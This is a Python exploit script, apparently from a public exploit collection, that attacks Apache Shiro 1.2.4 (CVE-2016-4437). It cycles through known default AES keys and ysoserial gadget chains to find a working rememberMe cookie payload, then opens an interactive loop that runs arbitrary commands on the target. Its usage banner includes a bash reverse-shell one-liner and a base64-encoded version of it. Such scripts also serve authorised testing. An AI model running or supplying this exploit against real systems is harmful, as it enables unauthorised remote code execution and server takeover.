#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: zhzyker
# from: https://github.com/zhzyker/exphub
import os
import sys
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES

if len(sys.argv)!=2:
    print('+-------------------------------------------------------------------------------------------------------+')
    print('+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +')
    print('+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +')
    print('+                                                                                                       +')
    print('+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +')
    print('+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +')
    print('+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +')
    print('+-------------------------------------------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url>                                                                         +')
    print('+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080                                                   +')
    print('+ VER: Apahce Shiro <= 1.2.4                                                                            +')
    print('+-------------------------------------------------------------------------------------------------------+')
    sys.exit()
url = sys.argv[1]
cmd_sleep = 'sleep-5'
ysoserial = 'ysoserial-sleep.jar'
gadget_list = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","Spring1","Spring2","Jdk7u21","ROME","Clojure"]
#key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==", "U3ByaW5nQmxhZGUAAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==", "fCq+/xW488hMTCD+cmJ3aQ==", "1QWLxg+NYmxraMoxAXu/Iw==", "ZUdsaGJuSmxibVI2ZHc9PQ==", "L7RioUULEFhRyxM7a2R/Yg==", "r0e3c16IdVkouZgk1TKVMg==", "bWluZS1hc3NldC1rZXk6QQ==", "a2VlcE9uR29pbmdBbmRGaQ==", "WcfHGU25gNnTxTlmJMeSpw==", "ZAvph3dsQs0FSL3SDFAdag==", "tiVV6g3uZBGfgshesAQbjA==", "cmVtZW1iZXJNZQAAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", "RVZBTk5JR0hUTFlfV0FPVQ==", "WkhBTkdYSUFPSEVJX0NBVA=="]
key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA=="]

header = {
'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
}


print ("[*] Testing gadget")
for gadget in gadget_list:
    print ("[*] Check gadget: " + gadget)
    for key in key_list:
        popen = subprocess.Popen(['java', '-jar', ysoserial, gadget, cmd_sleep], stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        payload = base64_ciphertext.decode()
        try:
            r = requests.get(url, headers=header, cookies={'rememberMe': payload}, timeout=10)
            time = r.elapsed.seconds
            if time >= 5:
                key_succes = key
                gadget_succes = gadget
                print ("[+] Find gadget: " + gadget_succes)
            else:
                key_failed = key
                gadget_failed = gadget
        except:
            print ("[-] Check Failed: " + gadget)

print ("[+] Find Key: " + key_succes)


def exploit(url, cmd, key_succes, gadget_succes):

    if system == "linux":
        base64_cmd = base64.b64encode(str.encode(cmd))
        cmd64 = base64_cmd.decode('ascii')
        command = "bash -c {echo," + cmd64 + "}|{base64,-d}|{bash,-i}"
        print ("[+] [Linux] Base64 Command: " + command)
    elif system == "windows":
#        print (gadget_succes)
        command = str(cmd)
        print ("[+] [Windows] Command:" + command)

    popen = subprocess.Popen(['java', '-jar', ysoserial, gadget_succes, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key_succes), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    payload = base64_ciphertext.decode()
    try:
        r = requests.get(url, headers=header, cookies={'rememberMe': payload}, timeout=10)
        if r.status_code == 200:
            print ("[+] Command Send Succes, Please Check (No Echo)")
        else:
            print ("[-] Command Send Failed, Please Check (No Echo)")
    except:
        print ("[-] Command Send Failed, Please Check (No Echo)")


    
if key_succes:
    while 1:
        system = input("[*] System (linux or windows): ")
        if system == "linux":
            while 2:
                cmd = input("Shell >>> ")
                if cmd == "exit" : exit(0)
                exploit(url, cmd, key_succes, gadget_succes)
        elif system == "windows":
            while 3:
                cmd = input("Shell >>> ")
                if cmd == "exit" : exit(0)
                exploit(url, cmd, key_succes, gadget_succes)
        elif system == "exit": exit(0)
        else:
            print ("[-] The operating system is not recognized")
else:
    print ("[-] Not Key, Not Gadget, Not vuln")
    sys.exit()
    
   
